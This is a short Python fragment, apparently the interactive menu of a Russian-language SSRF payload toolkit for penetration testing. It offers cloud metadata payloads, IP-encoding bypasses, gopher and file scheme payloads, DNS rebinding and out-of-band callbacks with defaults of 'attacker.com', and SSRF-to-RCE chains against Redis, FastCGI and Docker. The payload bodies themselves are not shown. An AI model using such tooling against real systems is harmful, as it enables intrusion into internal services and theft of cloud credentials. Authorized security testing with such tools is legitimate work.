    table.add_column("Опция")
    opts = [
        ("1", "Cloud metadata payloads (AWS/GCP/Azure/K8s/... 20+ провайдеров)"),
        ("2", "IP / Host bypasses (decimal/octal/hex/IPv6/NAT64/6to4)"),
        ("3", "Scheme payloads (gopher/dict/file/ftp/ldap/jar/netdoc)"),
        ("4", "Parser confusion (userinfo/@/backslash/CRLF/unicode)"),
        ("5", "DNS rebinding helpers"),
        ("6", "Blind SSRF / OOB helpers (interactsh/webhook)"),
        ("7", "SSRF → RCE chains (Redis/FastCGI/Docker)"),
        ("8", "Экспорт всех payloads (JSON/MD/TXT)"),
    ]
    for n, t in opts:
        table.add_row(n, t)
    console.print(table)
    console.print("[yellow]⚠ Только для авторизованного пентеста.[/yellow]")
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    if c == "1":
        show_cloud_payloads()
    elif c == "2":
        show_ip_bypasses()
    elif c == "3":
        show_scheme_payloads()
    elif c == "4":
        show_parser_confusion()
    elif c == "5":
        d = Prompt.ask("Домен для rebinding",
                       default="rebind.attacker.com")
        show_dns_rebinding(d)
    elif c == "6":
        d = Prompt.ask("Домен для callback", default="attacker.com")
        show_blind_helpers(d)
    elif c == "7":
        show_rce_chains()
    elif c == "8":
        cli_export_all()